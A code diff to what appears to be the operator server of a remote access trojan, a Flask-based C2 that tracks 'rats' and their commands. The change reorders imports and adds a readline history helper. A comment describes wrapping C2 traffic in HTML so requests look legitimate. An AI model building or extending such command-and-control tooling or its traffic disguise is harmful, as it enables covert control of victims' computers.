@@ -1,12 +1,13 @@
 #!/usr/bin/env python3
 from flask import Flask, request
 from datetime import datetime
+import threading
+import readline
+import logging
+import base64
 import time
 import json
-import base64
-import threading
 import sys
-import logging
 import os
 
 # CSCI 201 teacher: Noooo you can't just use global variables to make things easier
@@ -23,6 +24,15 @@ commands = {}
 rats = {}
 types = {}
 usernames = {}
+
+# Required function for interactive history
+def history(numlines=-1):
+    total = readline.get_current_history_length()
+    if(numlines == -1):
+        numlines = total
+    if(numlines > 0):
+        for i in range(total - numlines, total):
+            print(readline.get_history_item(i + 1))
 
 # Wrap C2 comms in html and html2 code to make requests look more legitimate
 def htmlify(data):
